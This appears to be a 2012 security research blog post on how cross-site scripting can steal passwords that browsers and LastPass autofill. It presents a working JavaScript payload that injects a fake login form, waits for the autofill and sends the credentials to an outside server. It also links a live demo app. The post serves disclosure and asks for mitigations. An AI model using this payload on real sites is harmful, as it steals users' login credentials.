---
layout: default
title: Abusing Password Managers with XSS
---
One common and effective mitigation against Cross-Site Scripting (XSS) is to set the HTTPOnly flag on session cookies. This will generally prevent an attacker from stealing users' session cookies with XSS. There are ways of circumventing this (e.g. the HTTP TRACE method), but generally speaking, it is fairly effective. That being said, an attacker can still cause significant damage without being able to steal the session cookie.

A variety of client-side attacks are possible, but an attacker is also often able to circumvent Cross-Site Request Forgery (CSRF) protections via XSS and thereby submit various forms within the application. The worst case scenario with this type of attack would be that there is no confirmation for email address or password changes and the attacker can change users' passwords. From an attacker's perspective this is valuable, but not as valuable as being able to steal a user's session. By reseting the password, the attacker is giving away his presence and the extent to which he is able to masquarade as another user is limited. While stealing the session cookie may be the most commonly cited method for hijacking user accounts, other means not involving changing user passwords exist.

All modern browsers come with some functionality to remember user passwords. Additionally, users will often install third-party applications to manage their passwords for them. All of these solutions save time for the user and generally help to prevent forgotten passwords. Third party password managers such as LastPass are also capable of generating strong, application specific passwords for users and then sending them off to the cloud for storage. Functionality such as this greatly improves the overall security of the username/password authentication model. By encouraging and facilitating the use of strong application specific passwords, users need not be as concerned with unreliable web applications that inadequately protect their data. For these and other reasons, password managers such as LastPass are generally considered within the security industry to be a good idea. I am a long time user of LastPass and have (almost) nothing but praise for their service.

An issue with both in-browser as well as third-party password managers that gets hardly any attention is how these can be abused by XSS. Because many of these password managers automatically fill login forms, an attacker can use JavaScript to read the contents of the form once it has been filled. The lack of attention this topic receives made me curious to see how exploitable it actually would be. For the purpose of testing, I built a simple PHP application with a functional login page aswell as a second page that is vulnerable to XSS (find them [here](https://gist.github.com/2346364)). I then proceded to experiment with different JavaScript, attempting to steal user credentials with XSS from the following password managers:

- LastPass (Current version as of April 2012)
- Chrome (version 17)
- Firefox (version 11)
- Internet Explorer (version 9)

I first visited my login page and entered my password. If the password manager asked me if I wanted it to be remembered, I said yes. I then went to the XSS vulnerable page in my application and experimented with different JavaScript, attempting to access the credentials stored by the browser or password manager. I ended up writing some JavaScript that was effective against the password managers listed above with the exception of IE:

{% highlight html %}
<script>
    ex_username = '';
    ex_password = '';
    inter = '';
    function attack(){
        ex_username = document.getElementById('username').value;
        ex_password = document.getElementById('password').value;
        if(ex_username != '' | ex_password != ''){
            document.getElementById('xss').style.display = 'none'
            request=new XMLHttpRequest();
            url = "http://btoe.ws/pwxss?username="+ex_username+"&password="+ex_password;
            request.open("GET",url,true);
            request.send();
            document.getElementById('xss').style.visibility='hidden';
            window.clearInterval(inter);
        }
    }
    document.write("
    <div id='xss'>
    <form method='post' action='index.php'>
    username:<input type='text' name='username' id='username' value='' autocomplete='on'><br>
    password:<input type='password' name='password' id='password' value='' autocomplete='on'><br>
    <input type='submit' name='login' value='Log In'>
    </form>
    </div>
    ");
    inter = window.setInterval("attack()",100);
</script>
{% endhighlight %}

All that this code does it create a fake login form on the XSS vulnerable page and then wait for it to be filled in by the browser or password manager. When the fields are filled, the JavaScript takes the values and sends them off to another server via a simple Ajax request. At first I had attempted to harness the ```onchange``` event of the form fields, but it turns out that this is unreliable across browsers (also, LastPass seems to mangle the form and input field DOM elements for whatever reason). Using ```window.setInterval```, while less elegant, is more effective.

If you want to try out the above code, go to [http://boomer.neohapsis.com/pwxss](http://boomer.neohapsis.com/pwxss) and login (username:**user1** password:**secret**). Then go to the reflections page and enter the slightly modified code listed there into the text box. If you told your password manager to remember the password for the site, you should see an alert  box with the credentials you previously entered. Please let me know if you find any vulns aside from XSS in this app.

To be honest, I was rather surprised that my simple trick worked in Chrome and Firefox. The LastPass plugin in the Chrome browser operates on the DOM level like any other Chrome plugin, meaning that it can't bypass event listeners that are watching for form submissions. The browsers, on the other hand could put garbage into the form elements in the DOM and wait until after the ```onsubmit``` event has fired to put the real credentials into the form. This might break some web applications that take action based on the ```onchange``` event of the form inputs, but if that is a concern, I am sure that the browsers could somehow fill the form fields without triggering this event.

The reason why this code doesn't work in IE (aside from the non-IE-friendly XHR request) is that the IE password manager doesn't automatically fill in user credentials. IE also seems to be the only one of the bunch that ties a set of credentials to a specific page rather than to an entire domain. While these both may be inconveniences from a usability perspective, they (inadvertantly or otherwise) improve the security of the password manager.

While this is an attack vector that doesn't get much attention, I think that it should. XSS is a common problem, and developers get an unrealistic sense of security from the HTTPOnly cookie flag. This flag is largely efective in preventing session hijacking, but user credentials may still be at risk. While I didn't get a chance to check them out when researching this, I would not be surprised if Opera and Safari had the same types of behavior.

I would be interested to hear a discussion of possible mitigations for this vulnerability. If you are a browser or browser-plugin developer or just an ordinary hacker, leave a comment and let me know what you think.